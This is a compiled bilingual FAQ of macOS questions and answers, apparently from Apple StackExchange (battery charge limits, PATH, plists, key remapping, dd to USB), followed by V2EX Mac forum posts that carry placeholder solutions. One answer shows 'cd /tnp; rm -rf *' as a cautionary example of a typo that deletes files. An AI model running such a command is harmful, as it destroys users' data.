Tags: macbook-pro, display | Score: 94 | Views: 90132 | Answers: 5

**解决方案 / Solution**:
Command + Brightness Up is the keyboard shortcut for Detect Displays in Lion.

---

#### 226. Disable Command-W in the terminal

**问题描述 / Problem Description**:
Tags: terminal, keyboard | Score: 94 | Views: 39334 | Answers: 8

**解决方案 / Solution**:
To disable ⌘W in Terminal, do the following:

From the  menu in the top left corner of the screen, select System Preferences. Click on Keyboard then Keyboard Shortcuts then Application Shortcuts.


Click the + button to add a new shortcut

Select &quot;Terminal.app&quot; for the application, and for the command, type Close (this is case sensitive). You must provide a keybinding, but it doesn't have to be the default. In the shortcut box, give it a different shortcut, like ⌘ControlW 

Now ⌘W will not close your terminal windows.

---

#### 227. What tool exists to identify the RGB value of a pixel?

**问题描述 / Problem Description**:
Tags: macos, image-capture | Score: 93 | Views: 74880 | Answers: 17

**解决方案 / Solution**:
There is a utility (in Applications/Utilities) called Digital Color Meter, which shows the color code of whatever you're hovering at the moment. It's a bit more lightweight than Preview. There are also shortcuts for copying the color value as a string (⇧+⌘+C) or image (⌥+⌘+C).

---

#### 228. How to get a notification when my commands are done

**问题描述 / Problem Description**:
Tags: macos, command-line, bash | Score: 93 | Views: 79834 | Answers: 19

**解决方案 / Solution**:
(svn update . &amp;&amp; ant clean build start &amp;&amp; say done) || say error

---

#### 229. How to disable Adobe Core Sync app on OS X from being launched automatically?

**问题描述 / Problem Description**:
Tags: macos, launchd, adobe | Score: 93 | Views: 123416 | Answers: 5

**解决方案 / Solution**:
You can disable this Finder Sync extension from the System Preferences → Extensions pane (grey puzzle piece icon) – just untick Finder under the app name in question.
Then log out and back in (or restart if you have more than one user logged in to your Mac)


In OS X, the Finder Sync extension point lets you cleanly and safely modify the Finder’s user interface to express file synchronization status and control. Unlike most extension points, Finder Sync does not add features to a host app. Instead, it lets you modify the behavior of the Finder itself.

Extensions are parts of an app that are able to integrate with certain core components of the OS. Finder Sync extensions in particular enable tighter integration with Finder by way of sync status badges, and allowing buttons to be added to the toolbar, sidebar, and right click menus.
OS X keeps a database of all known apps on your computer, and this also includes any extensions (.appex bundles). When Finder launches, it queries this database for Finder Sync extensions and launches them. For security reasons, each extension lives in its own process.

---

#### 230. Can I tell my Mac to charge to 80% only?

**问题描述 / Problem Description**:
Tags: macos, macbook-pro, battery, charging, power | Score: 93 | Views: 146080 | Answers: 10

**解决方案 / Solution**:
Use bclm (Apple Silicon with macOS 13.0 or higher and Intel Macs)
Follow the instructions on GitHub:

Download signed and notarized binary from releases.
(Alternatively, you can also get it from Homebrew or compile it manually. Read the GitHub readme for more details.)

Extract battery tool


$ unzip bclm.zip
$ sudo cp bclm /usr/local/bin


Set battery limit

$ sudo bclm write 80


Verify battery limit to 80%

$ bclm read


Reset the limit back to 100% when needed

$ sudo bclm write 100

Notes:

It might be better if you set it even lower, for example, 60% or 70%. Then, before you need to use it on battery for a long time, bclm write 100. You can automate this switching between 80% and full using launchd (read man launchd.plist).
macOS show charge approximately 3-5% greater than the real value, so it may feel like the tool is not working initially. Use coconutbattery (GUI) or ioreg -l | awk '$3~/Capacity/{c[$3]=$5}END{OFMT=&quot;%.3f&quot;;max=c[&quot;\&quot;MaxCapacity\&quot;&quot;];print(max&gt;0?100*c[&quot;\&quot;CurrentCapacity\&quot;&quot;]/max:&quot;?&quot;)}'[1] to calculate real battery charge level.
If you are using macOS Catalina or higher, you need to turn off the &quot;Optimised battery charging&quot; function for the tool to work properly, otherwise, the value you set might be overwritten.
There is also a GUI version: charge-limiter. Both work by setting the BCLM key in SMC to a custom value.

For Apple Silicon Macs and macOS 11 (Big Sur) and higher, use AlDente.
Alternatively, there is a more lightweight tool with a command line version: battery.
[1] No longer works with Apple Silicon Macs.

---

#### 231. Official way to obtain an OS X ISO file

**问题描述 / Problem Description**:
Tags: macos, virtualbox, iso | Score: 93 | Views: 646135 | Answers: 4

**解决方案 / Solution**:
Does not work on Mavericks and Yosemite
There is no way to legitimately get the file without having access to a Mac, and a licensed copy of the OS via a purchase (unless you are a member of the Developer Program, for which you can expect to pay far more than the cost of the OS, what with it being free).
But if you can blag some access time on a Mac, then you can download the OS from the Mac App Store (You may need to Option+Click the Purchased section to force it to reshow them if you have downloaded them at least once already).  Once you have the installer downloaded and sat in your dock, you can simply pick it apart and get to  the image file that is inside it.
This is the official way to get the file direct from Apple, but there is still work to do to make it into an ISO:

Once you’ve downloaded Mavericks, find the installer on your Mac. It’s called Install OS X Mavericks.app and it should have been downloaded to your main Applications folder or be sat in your Dock.

Right-click (or Control+click) the installer, and choose Show Package Contents from the resulting contextual menu.

In the folder that appears, open Contents &gt; Shared Support; you’ll see a disk image file called InstallESD.dmg
This dmg file is in essence an ISO file in s slightly different format.  We'll need to convert it.  Open up Disk Utility and:

From the menu bar, select Images &gt; Convert and point it to your .dmg file

In the Save As dialog that follows, select DVD/CD master. Disk Utility will insist on saving the new ISO as a .cdr file, but it is really an ISO.

When complete, you can rename it to .iso in Finder.

Use an external HD or thumb drive which is in ExFAT format (Compared to FAT format, this allows for single files larger than 4GB). Copy the .iso file and access it on the other system.


For clarity, you can do the above on any version of OS X from 10.6.8 (Snow Leopard) onwards, so you can use an old image to get hold of a new image for example, if you have access to a different OS version than Mavericks.

---

#### 232. How to set PATH for Finder-launched applications

**问题描述 / Problem Description**:
Tags: macos, finder, path | Score: 93 | Views: 72141 | Answers: 8

**解决方案 / Solution**:
If you are on 10.7 and not 10.8, the solution below works well:

I had the same problem with eclipse, but now I've added e.g. the following to my .bash_profile and then it worked.

export PATH=some_path:another_path
launchctl setenv PATH $PATH


In case you want to leave the original path intact use

p=$(launchctl getenv PATH)
launchctl setenv PATH /my/new/path:$p


instead (or just launchctl setenv PATH /my/new/path:$(launchctl getenv PATH)).

Note: Changing the launchctl PATH will not take effect until the Dock is "restarted".  A new Dock process will automatically start after the current one is killed with the command:

killall Dock

---

#### 233. What is rapportd and why does it want incoming network connections?

**问题描述 / Problem Description**:
Tags: macos, daemons | Score: 93 | Views: 275196 | Answers: 7

**解决方案 / Solution**:
EDIT: It looks like the man page has been updated and now reads:
Daemon that enables Phone Call Handoff and other communication features between Apple devices.

I just had the same experience. The man page states that it is a:
Daemon providing support for the Rapport connectivity framework.
Checking the code signature with codesign -dv --verbose=4 /usr/libexec/rapportd shows it is signed by Apple and in a SIP-protected location (unless you turned off SIP), this appears to be legitimate Apple software. The man page implies it's related to communication, though I've yet to find any real documentation on it.
(Thanks to John Keates for the code-signature tip.)

---

#### 234. Is there a way to mute sound from one application on macOS?

**问题描述 / Problem Description**:
Tags: macos, audio | Score: 93 | Views: 413657 | Answers: 6

**解决方案 / Solution**:
There's a nice open source app, BackgroundMusic, that provides for per app volume control in OSX10.10+:

---

#### 235. What are alternatives for Menumeters on El Capitan?

**问题描述 / Problem Description**:
Tags: software-recommendation, macos | Score: 92 | Views: 61691 | Answers: 4

**解决方案 / Solution**:
I just ported MenuMeters for El Capitan, please go to http://member.ipmu.jp/yuji.tachikawa/MenuMetersElCapitan/.

---

#### 236. How to monitor file access for an OS X application?

**问题描述 / Problem Description**:
Tags: terminal, activity-monitor, unix | Score: 92 | Views: 117797 | Answers: 8

**解决方案 / Solution**:
Instruments—a part of the Apple Xcode development suite—can monitor all file access and writes. Open it from /Applications/Xcode.app/Contents/Applications/Instruments.app, select your application or process, and press Start. You have extensive filter options available in the menus.

Older versions of Xcode are storing the App at /Developer/Applications/Instruments.app

---

#### 237. How can I prevent Music app from starting automatically randomly?

**问题描述 / Problem Description**:
Tags: itunes, music, macos | Score: 91 | Views: 89523 | Answers: 11

**解决方案 / Solution**:
There are very specific triggers to start the app and playback.
I have had this experience and I discovered that my finger was lightly brushing the &quot;Play&quot; button on the MacBook Pro's Touch Bar. If the current app has no hook for that button, it seems that macOS now chooses to launch the Music app.
The solution should be to run:
launchctl unload -w /System/Library/LaunchAgents/com.apple.rcd.plist

See this howtogeek for details.
Alternatively, you can use noTunes from Tom Taylor to prevent iTunes or Apple Music from launching automatically.
Additional triggers are connected headphones and third-party apps that send automation messages (such as LaunchBar search results being sent to Music app / iTunes).

---

#### 238. How do I edit a .plist file?

**问题描述 / Problem Description**:
Tags: macos, plist | Score: 90 | Views: 238553 | Answers: 9

**解决方案 / Solution**:
If the plist file is in the XML format, you can edit it in any text editor like TextEdit. If the plist file is in the binary format, you can convert it to XML first by running:

plutil -convert xml1 file.plist


If you want to go back to binary format after editing:

plutil -convert binary1 file.plist


If you have Xcode 4.3 or later, you can use it to edit property lists in a graphical editor like this:



Xcode 4.2 and earlier came with a separate application for editing property lists (/Developer/Applications/Utilities/Property List Editor.app/).

---

#### 239. Why is macOS often referred to as &#39;Darwin&#39;?

**问题描述 / Problem Description**:
Tags: macos, darwin | Score: 90 | Views: 59658 | Answers: 6

**解决方案 / Solution**:
Why is macOS often referred to as 'Darwin'?

It isn't. macOS isn't Darwin and Darwin isn't macOS.
The history of macOS is long, convoluted, and complicated.
It starts with Steve Jobs (not entirely voluntary) &quot;leaving&quot; Apple and founding NeXT. NeXT wanted to revolutionize the Personal Workstation. They built both a powerful computer, the NeXT Computer (later NeXTstation and NeXTcube), and a powerful, modern Operating System, called NeXTStep. (Get it? The next step for the next computer. Really creative naming.)
The Operating System was based on porting BSD to a Mach microkernel, and adding object-oriented system libraries, frameworks, and toolkits (called &quot;kits&quot;, which you can still see in Apple's naming today), with an object-oriented GUI framework and desktop, with object-oriented applications, all written in a modern object-oriented programming language (Objective-C) as the systems language, on top of the base BSD system. The display system was based on PostScript, and there was even an Intel i860 coprocessor running a stripped-down version of the OS, only for Display PostScript processing, plus a powerful DSP for video and audio processing.
NeXTStep pioneered many things we see in modern GUI programming. It had one of the first graphical GUI Builders, which still to this day is how you design GUIs for macOS, iOS, iPadOS, etc. (Today, it is called the Xcode Interface Builder.) It had the first ever App Store. When Tim Berners-Lee invented the World Wide Web, he chose NeXTStep as the OS to write the first browser for. Many game studios used NeXTStep and NeXT workstations for their development, e.g. id software for Doom, Doom 2, and Quake. Lotus Improv, still considered by many to be miles ahead of Excel even now, was implemented on NeXTStep.
Later, NeXT divorced the higher-level frameworks from the underlying OS and made them available under the name OpenStep for Windows NT, Sun Solaris, and under the name &quot;OPENSTEP for Mach&quot; still based on the same underpinnings as the original NeXTStep.
At this point, Apple had tried and failed multiple times to modernize MacOS, and they bought NeXT (thus bringing Steve Jobs back into the company) and all of its Intellectual Property and technology to develop a successor to MacOS based on OPENSTEP for Mach. They modernized the Mach kernel from 2.5 to 3 and extended it with concepts from the FreeBSD kernel to form a kernel known as xnu (a reference to the failed nuKernel project at Apple which was to develop a &quot;new kernel&quot;), and the BSD underpinnings from 4.3BSD to 4.4BSD and later FreeBSD.
Most importantly, they extended and expanded the OpenStep APIs and built new APIs on top. The collection of those APIs is known as &quot;Cocoa&quot;. They also built an API called &quot;Carbon&quot;, which was a close, but not identical re-implementation of a subset of the MacOS API on top of the new foundations. (The intention was that while it would not be possible to simply re-compile existing MacOS applications, it should be fairly easy to port them to Carbon, and then over the years rewrite them in Cocoa.)
The first prototype of this system was called Rhapsody. The full system wasn't finished in time, so a subset was released as MacOS X Server 1.0. And the rest is history: Rhapsody became MacOS X, then OS X, then macOS, and somewhere along the way, iOS was split off, and then further divided into iOS, iPadOS, tvOS, and watchOS.
Now, back to Darwin: Darwin is basically the underpinnings of macOS, from the xnu kernel, IOKit, drivers, etc. up to the BSD libraries and userland, plus some macOS-specific developments such as mDNSresponder and launchd. It does not, however, include any parts of what used to be OpenStep, Cocoa, Aqua, Quartz, QuickTime, or any of the other higher-level stuff. It does contain drivers and filesystems, although I am not entirely sure whether APFS is part of Darwin.
If you think back to the point in time where NeXT &quot;divorced&quot; the high-level OpenStep from its underpinnings, the low-level parts that are not OpenStep would be the ones that would later become Darwin.
In the beginning, Apple used to make Darwin available as a separate OS, including compiled binaries, installers, ISOs, etc. that you could install on Apple hardware. However, for many years now, Apple only provides a source code dump, every time a new release of macOS comes out. It isn't even possible to compile this source code, because it depends on Apple's internal build tools and build pipeline. There have been some projects trying to patch Darwin to compile it with publicly available tools, but those projects have all died from lack of interest.
Since all of the things you mentioned were born on Unix and use Unix APIs and Unix libraries, they actually typically don't even know about the &quot;non-Darwin&quot; parts of macOS, so it is only logical that they will consider the OS to be &quot;Darwin&quot;. Note that &quot;Darwin&quot; is also what gets returned as the name of the OS when you call the Unix/POSIX int uname(struct utsname *buf) library function or the uname Unix/POSIX commandline utility.
So, to answer the question you didn't ask explicitly but is implicit in your question: why does Node.js return &quot;Darwin&quot; for the name of macOS? Because when Node.js asks macOS for its name, that's what macOS tells it its name is!

---

#### 240. How can I track progress of dd

**问题描述 / Problem Description**:
Tags: macos, command-line | Score: 89 | Views: 96849 | Answers: 8

**解决方案 / Solution**:
The same information, displayed every second by in klanomath's answer, can displayed using your command. You just need to enter a controlT character from the keyboard while the dd command is executing.
By pressing the controlT character, you are sending the same SIGINFO signal to the dd command that the command pkill -INFO -x dd sends.

---

#### 241. On OS X, what files are excluded by rule from a Time Machine backup?

**问题描述 / Problem Description**:
Tags: macos, time-machine | Score: 89 | Views: 48095 | Answers: 5

**解决方案 / Solution**:
In earlier versions of macOS (pre-11.x) there was a built-in list of exclusions stored in /System/Library/CoreServices/backupd.bundle/Contents/Resources/StdExclusions.plist. It's a bit too long to paste here comfortably, so I've posted a copy StdExclusions.plist (10.7.1) on Pastebin. There also is StdExclusions.plist (10.6.8 Server) on Pastebin.
Some of the more obvious user file exclusions are Trash, Document revisions and MobileBackups from the local Time Machine store are all excluded. The rest of the exclusions are for system things like caches and databases that exist to index other files where the system can regenerate these databases after a restore.

In addition, apps can use a file's metadata to exclude a file from backups. You can view this list of files by running the command:
sudo mdfind &quot;com_apple_backup_excludeItem = 'com.apple.backupd'&quot;

On my system this outputs the following:
/Users/brant/Library/Calendars/Calendar Cache
/Users/brant/Music/iTunes/iTunes Music Library.xml
/Users/brant/Library/iTunes/iPod Software Updates
/Users/brant/Library/iTunes/iPad Software Updates
/Users/brant/Library/iTunes/iPhone Software Updates
/Users/brant/Pictures/iPod Photo Cache
/Volumes/Archive/brant/Pictures/iPhoto Library/iPod Photo Cache
/Volumes/Archive/brant/Pictures/iPhoto Library/AlbumData.xml
/Users/brant/Library/Application Support/Google/Chrome/Safe Browsing Csd Whitelist
/Users/brant/Library/Application Support/Google/Chrome/Safe Browsing Bloom
/Users/brant/Library/Application Support/Google/Chrome/Safe Browsing Bloom Filter 2
/Users/brant/Library/Application Support/Google/Chrome/Safe Browsing Download
/Users/brant/Documents/Virtual Machines/Visual Studio.pvm/{ae6f7518-762e-4fcd-b166-c7a914fc237f}.mem
/Users/brant/Music/iTunes/Album Artwork/Cache
/Users/brant/Library/Saved Application State
/Users/brant/Library/Application Support/Google/Chrome/Default/History-journal
/Users/brant/Library/Application Support/Google/Chrome/Default/Favicons-journal
/Users/brant/Library/Application Support/Google/Chrome/Default/Favicons
/Users/brant/Library/Application Support/Google/Chrome/Default/History
/Users/brant/Library/Icons/WebpageIcons.db
/Users/brant/Library/Safari/WebpageIcons.db

As you can see, there are a few files here which various apps have told Time Machine not to bother with. Internally, this works by changing the extended attribute  com.apple.metadata:com_apple_backup_excludeItem.
Furthermore, on Lion, the tmutil command allows you to query, set, and delete file exclusions from the command line:

tmutil isexcluded _item_ will determine if the volume, directory or file is currently excluded.
tmutil addexclusion _item_ sets an exclusion rule so that the item (even if moved to a new location or renamed) will be excluded from future backups.
tmutil addexclusion -p _item_ sets an exclusion rule so that the item path is excluded. This remains unchanged so if the file moves it will be backed up if not at this exact path and also will prevent backing up a file if it comes back in the same location as the rule specifies.
tmutil removeexclusion _item_ removed either type of exclusion rule as appropriate.

---

#### 242. Can a Mac&#39;s model year be determined with a Terminal Command?

**问题描述 / Problem Description**:
Tags: macos, terminal | Score: 89 | Views: 117697 | Answers: 11

**解决方案 / Solution**:
You can indirectly get this information from a web page and the curl command. In the past this URL has been taken down and rate limited and put behind some sort of captcha to prevent this use.
In December 2024, it’s down again so you might need to resort to other avenues like https://checkcoverage.apple.com/ in that case.
Depending on if your serial numer is 11 or 12 characters long take the last 3 or 4 characters, respectively, and feed that to the following URL after the ?cc=XXXX part. If your serial number was 12 character and ended in DJWR, you would issue this command:
curl https://support-sp.apple.com/sp/product?cc=DJWR

To get your serial number, use the following command:
system_profiler SPHardwareDataType | awk '/Serial/ {print $4}'

Thus, you could have a complicated command to query the internet if you need a single command:
curl https://support-sp.apple.com/sp/product?cc=$(
  system_profiler SPHardwareDataType \
    | awk '/Serial/ {print $4}' \
    | cut -c 9-
)

and then run the output of that through sed to cut to the key part
curl -s https://support-sp.apple.com/sp/product?cc=$(
  system_profiler SPHardwareDataType \
    | awk '/Serial/ {print $4}' \
    | cut -c 9-
) | sed 's|.*&lt;configCode&gt;\(.*\)&lt;/configCode&gt;.*|\1|'

There used to be a private library file with these mappings so you could consult it offline, but I noticed it was gone as of 10.8.3 (and perhaps earlier) so the above trick is the only one I know that works on the current OS without third party libraries.
Some nice third party libararies provide a look up of this:

python code https://github.com/MagerValp/MacModelShelf
JSON mapping https://github.com/krypted/swiftwarrantylookup/blob/master/src/swiftMacWarranty/model_snippets.json

Note that as of November 2017, Apple has forced the use of https over http for this service.

---

#### 243. how to reinstall xcode command-line tools?

**问题描述 / Problem Description**:
Tags: macos, command-line, xcode | Score: 89 | Views: 134138 | Answers: 5

**解决方案 / Solution**:
I run 
sudo rm -rf /Library/Developer/CommandLineTools
and then xcode-select --install


Problem fixed on my side

---

#### 244. How do I remap a key in macOS Sierra, e.g., Right Alt to Right Control?

**问题描述 / Problem Description**:
Tags: keyboard, macos, keybindings | Score: 89 | Views: 106820 | Answers: 5

**解决方案 / Solution**:
Apple's Technical Note TN2450 describes how to remap keys.  Running the following command will remap Right Alt to be Right Control.  

hidutil property --set '{"UserKeyMapping":
    [{"HIDKeyboardModifierMappingSrc":0x7000000e6,
      "HIDKeyboardModifierMappingDst":0x7000000e4}]
}'


Note that the above command is not switching the Right Alt and Right Control.  They will both be Right Control.  If you have a MacBook, you will not notice this until plugging in an external keyboard.  If you want to switch Right Alt and Right Control, you need to add a second switch command, like the following.

hidutil property --set '{"UserKeyMapping":
    [{"HIDKeyboardModifierMappingSrc":0x7000000e4,
      "HIDKeyboardModifierMappingDst":0x7000000e6},
     {"HIDKeyboardModifierMappingSrc":0x7000000e6,
      "HIDKeyboardModifierMappingDst":0x7000000e4}]
}'


The table at the bottom of the Technical Note has a list of hex values for each key.  To generalize the above answer to switch any keys, you must or the hex value from that list together with 0x700000000.  The following Python code demonstrates one way to do this.

In [1]: def convert(val):
   ...:     int_val = int(val, 16)
   ...:     int_ref = 0x700000000
   ...:
   ...:     return hex(int_ref | int_val)
   ...:

In [2]: r_alt = '0xE6'

In [3]: print(convert(r_alt))
0x7000000e6

---

#### 245. How can I make &#39;rm&#39; move files to the trash can?

**问题描述 / Problem Description**:
Tags: command-line, automation, macos | Score: 89 | Views: 72480 | Answers: 8

**解决方案 / Solution**:
Bad Idea
Using rm to move files to the trash is a dopamine hit. It is common and pleasuring but can be bad for you taken out of context.
You really need control yourself when using rm. Especially if your backups are not current or you don’t have the time to do an erase / install / restore.

Don't use rm
Imagine, you get used to rm moving to trash and make a habit of it. Sure, your system is safe but when you log into a friend's (or your wife's or your boss') notebook and have to delete something? You'll be actually using the real rm - deleting those files forever. Without lots of prep and qualifiers, it's a bad habit, and you need to know that.
So instead, install trash and make a habit of using it:
# Install `trash`, e.g. using `brew`
$ brew install trash

# Example usage
$ touch foo.txt
$ trash foo.txt
# `trash -l` prints the contents of the Trash
$ trash -l | grep foo.txt                                                                            
/Users/yourname/.Trash/foo.txt


Correcting bad habits
Here’s where the personal advice starts - changing one’s behavior is hard.
To help yourself re-train your habit so that you use trash instead of rm is alias it to a custom message in your .profile.
alias rm=&quot;echo Use 'del', or the full path i.e. '/bin/rm'&quot;

So, whenever you use rm, you'll be prompted to either use trash or /bin/rm. Remember, this is only temporary, after a while you should remove the alias.

Never ever, do something like this:
$ pwd
/
$ cd /tnp; rm -rf *
sh: cd: /tnp: No such file or directory

Pop Quiz: In what directory will the rmcommand run? :)

---

#### 246. How do I find out the applescript commands available for a particular app?

**问题描述 / Problem Description**:
Tags: macos, itunes, applications, applescript | Score: 89 | Views: 40723 | Answers: 2

**解决方案 / Solution**:
Yes, there is a simple way.


Open the Script Editor app (formerly called AppleScript Editor)
Go to File -> Open Dictionary
Select the app you want to find out more about.




When you open it, you can browse through the available AppleScript commands for that application and find what you want.

---

#### 247. How to disable Full Screen Animation on OS X 10.9

**问题描述 / Problem Description**:
Tags: macos, fullscreen | Score: 89 | Views: 29702 | Answers: 3

**解决方案 / Solution**:
macOS Sierra (10.12) introduced &quot;reduce motion&quot;.
Go to System Preferences &gt; Accessibility &gt; Display and check the box labeled Reduce motion.
I find this makes things much more pleasant ;)

---

#### 248. Xcode Error When Launching Terminal

**问题描述 / Problem Description**:
Tags: terminal, xcode | Score: 89 | Views: 38571 | Answers: 6

**解决方案 / Solution**:
Neither &quot;installing components&quot; via Xcode, nor resetting the developer directory using sudo xcode-select -r worked for me. However,
sudo xcode-select -s /Library/Developer/CommandLineTools

worked. Thanks to Royite on Apple's Developer Forums for this solution.

---

#### 249. What un(der)-documented features have you stumbled upon in Mountain Lion?

**问题描述 / Problem Description**:
Tags: macos | Score: 88 | Views: 15977 | Answers: 53

**解决方案 / Solution**:
You can now silence bouncing application icons in the Dock by just hovering over them, instead of needing to click and activate them.

---

#### 250. Copying ISO file to USB drive in OS X?

**问题描述 / Problem Description**:
Tags: macos, usb, unix, iso | Score: 88 | Views: 330775 | Answers: 11

**解决方案 / Solution**:
IMHO the easiest way is in terminal:

First run diskutil list
then insert your usb stick
and run diskutil list again to see the disk node (e.g. /dev/disk2).
Now run diskutil unmountDisk /dev/diskN
and do sudo dd if=/path-to.iso of=/dev/rdiskN bs=1m (or bs=1M with homebrew)
When finished diskutil eject /dev/diskN

---

#### 251. [V2EX] Codex App 替代全局语音输入

**问题描述 / Problem Description**:
不错啊，不用 Typeless 之类的语音输入了，自带的 Codex 现在就支持语音输入了。用 Karabiner 绑定到 Mac 自带的 Dictation 键上，挺方便。可以试试：在 Karabiner 里自己添加 Complex Modification：{  "description": "Physical F5 / Dictation key sends Command+Shift+D",  "manipulators": [    {      "from": {        "key_code": "f5",        "modifiers": {          "op

**解决方案 / Solution**:
See V2EX thread for community solutions.

---

#### 252. [V2EX] 受够了 Mac OS 上 Finder 的搜索体验，写了个 macOS 文件搜索工具

**问题描述 / Problem Description**:
用 Mac 这么多年，想找个文件每次用 Finder 都很难精准定位，搜索结果出来一堆没用的文件，真正要找的东西反而埋在下面。
索性自己写了一个，叫 AnySearch 。思路很简单：只做文件搜索，把这一件事做到极致。
简单说下它能干嘛：

快：百万级文件，搜索结果 3 毫秒出来
搜索语法：支持 ext:pdf 、size:&gt;100mb 、modified:today 这种组合查询，不用再一个个翻文件夹了
实时更新：实时感知文件变化，改了文件不到半秒就能查了
全局快捷键：⌥Space 随时呼出，用完就走
隐私：纯本地运行，不联网，不收集任何数据
原生 Swift 开发，Mac App S

**解决方案 / Solution**:
See V2EX thread for community solutions.

---

#### 253. [V2EX] 盖世游戏 macOS 太好用了，比 crossover 好多了

**问题描述 / Problem Description**:
终于拿到了 gamehub 的内测资格，之前 crossover 不能玩的游戏它也支持了，希望正式版出来以后是一次性买断式

**解决方案 / Solution**:
See V2EX thread for community solutions.

---

#### 254. [V2EX] 做了个 Menu 小工具，限制 Mac 充电上限，保护电池健康

**问题描述 / Problem Description**:
Mac 长期插着电用对电池健康不太友好，为了减少电池循环次数消耗，做个了小工具XBattery

https://apps.apple.com/cn/app/xbattery-battery-monitor/id6761967568?mt=12
目前功能：
🔋 支持设置最大充电上限（比如 80%）
🧩 菜单栏 APP 小而轻量
🎨 界面简洁，没多余功能
系统要求：

macOS 26.4+
Apple Silicon （ M1–M5 ）

兑换码自取:
6AXWWTXRR674MMMYF7
46X4AT4KN3WXEWMLAM
XLLT7M6FRM7YN8HEMW
NR4LLKRALE6LK3

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://apps.apple.com/cn/app/xbattery-battery-monitor/id6761967568?mt=12

---

#### 255. [V2EX] 苹果 macOS 27 将彻底放弃 Intel Mac

**问题描述 / Problem Description**:
早在去年的 WWDC 2025 开发者大会期间，苹果就已宣布，macOS 26 Tahoe 将是最后一个支持 Intel 处理器的版本。macOS 27 开始，苹果系统将仅兼容苹果自研处理器，预计包括 M 全系列，以及 A18 的 MacBook Neo 。
macOS 27 预计 6 月份推出 Beta 测试版，9 月推送正式版。

**解决方案 / Solution**:
See V2EX thread for community solutions.

---

#### 256. [V2EX] Mac 如何阻止软件自动更新？

**问题描述 / Problem Description**:
Mac 系统如何阻止指定软件自动更新，像微信 WPS Chrome 一打开经常会自动让我更新，手动修改 update 文件太麻烦了，下午研究了一下 LuLu 通过拦截自动更新的域名来实现阻止自动更新，弄了半天还是不行

**解决方案 / Solution**:
See V2EX thread for community solutions.

---

#### 257. [V2EX] mac 连接有线音响，看视频总是前几秒没声音

**问题描述 / Problem Description**:
如题，我的 mba 平时合盖外接一个戴尔显示器，显示器本身没有音响我现在用 3.5mm 接口外接了两个 beo A1 音响组立体声但是发现经常会有问题，比如用 b 站看视频，点进一个新视频的前 4 、5 秒经常都是没声音的，到了第 5 秒才有声音，但是也没有延迟。如果不想等 5 秒，也可以手动暂停视频再播放，一般也会有声音，就是有一种电脑找不到播放设备，需要等待或者手动激活输出源的感觉如果设置里输出选择 mba 内置扬声器，则没有这个问题上网搜了一圈也没有类似的问题或者提问，不知道有没有大神解答

**解决方案 / Solution**:
See V2EX thread for community solutions.

---

#### 258. [V2EX] mac (sequoia)上有啥好用的代理软件吗，目前用的是 shadowrocket（小火箭）

**问题描述 / Problem Description**:
用小火箭是因为在 iOS 上买了，Mac 上也可以用，但不得不说不太好用：

不稳定，有时候会自己关掉 VPN （据说是因为网络不稳定，但是这也太蛋疼了
不能测速（只能测延迟，而延迟又不等于网速，而且我最近发现有的节点他会什么都不显示，而其实他的速度还挺好的
不能自动选择最快的线路

最好是开源免费的，至少不要太贵😭

**解决方案 / Solution**:
See V2EX thread for community solutions.

---

#### 259. [V2EX] MacBookPro 哪个系统好用一点

**问题描述 / Problem Description**:
不小心升级了 macos26 ，有点不太习惯，想重装

**解决方案 / Solution**:
See V2EX thread for community solutions.

---

#### 260. [V2EX] Mac 选择， neo or 二手 air

**问题描述 / Problem Description**:
老爸赋闲在家，平常刷手机玩，最近要帮家里侄孙子参谋高考报考这种需求。选啥合适，线下也没摸过 neo ，估计等我摸过之后可能更明确一点了

**解决方案 / Solution**:
See V2EX thread for community solutions.

---

#### 261. [V2EX] macmini 上的通知怎么发送到 iPhone 上

**问题描述 / Problem Description**:
各位有好的同步通知的方法吗

**解决方案 / Solution**:
See V2EX thread for community solutions.

---

#### 262. [V2EX] Mac stduio m4 max 128G 2t 跑本地模型划算吗？

**问题描述 / Problem Description**:
Mac stduio m4 max 128G 2t 跑本地模型划算吗？现在用的 5090 正式版，不太够用

**解决方案 / Solution**:
See V2EX thread for community solutions.

---

#### 263. [V2EX] 安装 macFUSE 的困惑

**问题描述 / Problem Description**:
官网已经提示不需要重启了: https://macfuse.github.io

macFUSE 正在超越内核扩展
得益于 macFUSE 中的新 FSKit 后端，支持的文件系统现在可以在 macOS 26 上完全在用户空间运行。这意味着不再需要重启到恢复模式来启用对 macFUSE 内核扩展的支持。安装更快，安装体验也变得无缝。

但是我在 M5 安装了 5.20.0 版本之后，还是提示要在“隐私与安全性”启用系统拓展。点击“启用”时，提示：

若要启用系统拓展，你需要在“恢复”环境中修改安全性设置。
若要执行此操作，请将系统关机。然后按住触控 ID 或电源按钮以开启“启动安全性实用工具”

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://macfuse.github.io

---

#### 264. [V2EX] 请问 mac 间如何互相远程，分局域网环境和公网环境

**问题描述 / Problem Description**:
有没有原生的方式，不使用专门的远程客户端软件

**解决方案 / Solution**:
See V2EX thread for community solutions.

---

#### 265. [V2EX] Gemini app, now on Mac

**问题描述 / Problem Description**:
https://gemini.google/mac/

**解决方案 / Solution**:
See V2EX thread for community solutions.

**参考链接 / References**:
- https://gemini.google/mac/

---

#### 266. [V2EX] 预定 M5 pro 64G+1T 版本 macbook pro 的朋友都是等了多久拿到货的呀？

**问题描述 / Problem Description**:
3 月 21 在麦克先生那里预定了一台 14 寸 M5 pro 64G+1T 版本，当时说是大概 4-5 周发货。现在 5 周过去了还是没有消息。想问问大家买的同配置都是多久到货的？

**解决方案 / Solution**:
See V2EX thread for community solutions.

---

#### 267. [V2EX] 关于现在注册土区和尼区 apple id 的几个问题，请教一下各位

**问题描述 / Problem Description**:
可以在电脑上用网页注册吗？
听说现在注册土区尼区 id 很容易在登录时被强行修改至国区，请问有没有稳定方法可以注册 apple id 且避免这种情况？
最重要的是，请问现在是不是一个手机号只能注册一个苹果 id ？这样的话一个手机号的人岂不是没办法同时注册两个账号了？

**解决方案 / Solution**:
See V2EX thread for community solutions.

---

#### 268. [V2EX] 推荐个 mac 的显示器吧？ 618 想搞一个

**问题描述 / Problem Description**:
2000 左右的

**解决方案 / Solution**:
See V2EX thread for community solutions.

---

#### 269. [V2EX] ios loon 订阅链接问题

**问题描述 / Problem Description**:
一直都是用 loon ，然后通过订阅加一些插件使用，最近好像很多梯子订阅链接都不支持了，都是用自己的客户端，请问这种情况怎么使用 loon 啊，求教，各位大佬。

**解决方案 / Solution**:
See V2EX thread for community solutions.

---

#### 270. [V2EX] 苹果 App Store 国区充值可获额外 10% 奖励

**问题描述 / Problem Description**:
N/A

